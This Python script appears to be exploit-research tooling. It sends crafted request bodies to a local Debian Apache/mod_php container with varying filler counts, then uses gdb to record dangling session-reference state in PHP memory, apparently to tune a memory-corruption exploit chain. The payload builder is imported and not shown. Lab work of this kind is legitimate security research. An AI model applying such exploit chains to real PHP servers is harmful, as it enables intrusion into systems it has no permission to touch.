#!/usr/bin/env python3
"""Sweep A2 filler counts on the Debian package and record the leftover
session-reference state (rc/type/val) plus the dangling hsv offset."""
import json, os, subprocess, sys, time

D = "/tmp/opencode/research/modphp_84_matrix_20261023T074116Z"
sys.path.insert(0, os.path.join(D, "scripts"))
sys.path.insert(0, "/tmp/opencode/research/9bie_update_20261022T115026Z/code/repo/pure")
import chain84 as C
from cheap_oom_a import build_body

CNAME = "m109-d8424pkg"
PORT = 18740
LOG = "/var/log/apache2/p2s-access.log"


def sh(cmd, **kw):
    return subprocess.run(cmd, capture_output=True, text=True, **kw)


def state(pid):
    r = sh(["docker", "exec", CNAME, "gdb", "-batch", "-p", str(pid), "-x", "/tmp/deb_state.gdb"])
    for line in r.stdout.splitlines():
        if line.startswith("DEBSTATE"):
            return dict(kv.split("=", 1) for kv in line.split()[1:])
    return {"err": (r.stdout + r.stderr).strip()[-200:]}


def log_lines():
    return sh(["docker", "exec", CNAME, "sh", "-c", "cat %s 2>/dev/null" % LOG]).stdout.splitlines()


def a2(fillers):
    return build_body(880, 64, fillers, b"a" * 32, b"k0", b"C" * 10)


def main():
    outdir = os.path.join(D, "out/debsweep")
    os.makedirs(outdir, exist_ok=True)
    fillers = [int(x) for x in sys.argv[1:]] or [0, 40, 80, 100, 110, 115, 120, 130, 150, 200]
    rec = []
    for f in fillers:
        sh(["docker", "restart", CNAME])
        time.sleep(2.0)
        n = len(log_lines())
        r = C.send_plain(PORT, "/index.php", a2(f))
        time.sleep(0.3)
        lg = log_lines()[n:]
        pid = int(lg[-1].split()[0]) if lg else None
        st = state(pid) if pid else {"err": "no pid"}
        row = {"fillers": f, "status": r.split(b"\r\n", 1)[0].decode("latin1"),
               "pid": pid, "state": st}
        rec.append(row)
        print(json.dumps(row), flush=True)
    json.dump(rec, open(os.path.join(outdir, "sweep.json"), "w"), indent=1)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
